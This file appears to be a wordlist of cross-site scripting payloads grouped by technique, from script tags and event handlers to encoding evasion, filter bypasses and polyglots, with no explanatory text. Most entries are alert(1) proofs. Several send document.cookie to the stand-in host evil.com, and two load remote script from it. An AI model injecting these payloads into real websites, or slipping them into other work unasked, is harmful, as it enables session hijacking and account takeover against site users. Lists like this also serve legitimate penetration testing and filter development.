# XSS (Cross-Site Scripting) Payloads
# Categories: script tags, event handlers, protocol handlers,
#             encoding evasion, SVG, template injection, DOM-based

# === Basic Script Tags ===
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
<script src="http://evil.com/x.js"></script>
<script>document.location='http://evil.com/?c='+document.cookie</script>
<script>new Image().src='http://evil.com/?c='+document.cookie;</script>
<script/src="http://evil.com/x.js"></script>

# === Event Handlers ===
<img src=x onerror=alert(1)>
<img src=x onerror="alert(1)">
<body onload=alert(1)>
<svg onload=alert(1)>
<div onmouseover="alert(1)">hover me</div>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video onerror=alert(1)><source src=x>
<details open ontoggle=alert(1)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<frameset onload=alert(1)>
<audio onerror=alert(1) src=x>
<body/onload=alert(1)>
" onfocus=alert(1) autofocus="
' onfocus='alert(1)' autofocus='

# === JavaScript Protocol ===
<a href="javascript:alert(1)">click</a>
<a href=javascript:alert(1)>click</a>
<a href="jAvAsCrIpT:alert(1)">click</a>
<a href="javascript:alert(document.cookie)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)">
<button formaction="javascript:alert(1)">
<object data="javascript:alert(1)">

# === Data URIs ===
<a href="data:text/html,<script>alert(1)</script>">click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">

# === SVG Vectors ===
<svg><script>alert(1)</script></svg>
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
<svg><set onbegin=alert(1) attributeName=x>
<svg><desc><script>alert(1)</script></desc></svg>
<svg><foreignObject><body onload=alert(1)></foreignObject></svg>

# === CSS/Style Injection ===
<div style="background-image:url(javascript:alert(1))">
<style>body{background-image:url("javascript:alert(1)")}</style>
<link rel=stylesheet href="javascript:alert(1)">

# === Encoding Evasion ===
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
\x3Cscript\x3Ealert(1)\x3C/script\x3E

# === Template Injection ===
{{constructor.constructor('alert(1)')()}}
${alert(1)}
#{alert(1)}
{{7*7}}
${7*7}

# === DOM-Based ===
<img src=x onerror="this.src='http://evil.com/?c='+document.cookie">
<img src=x onerror="window.location='http://evil.com/?c='+document.cookie">

# === Filter Bypass Tricks ===
<img src="x" onerror="alert(1)">
<img/src="x"/onerror="alert(1)">
<img	src=x	onerror=alert(1)>
<svg><script>alert&#40;1&#41;</script>
<script>window['alert'](1)</script>
<script>this['alert'](1)</script>
<script>top['al'+'ert'](1)</script>
<svg><use xlink:href="data:image/svg+xml,<svg onload=alert(1)>">

# === Polyglot ===
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
</script><svg onload=alert(1)>
'"><img src=x onerror=alert(1)>
';alert(1)//
"onmouseover="alert(1)
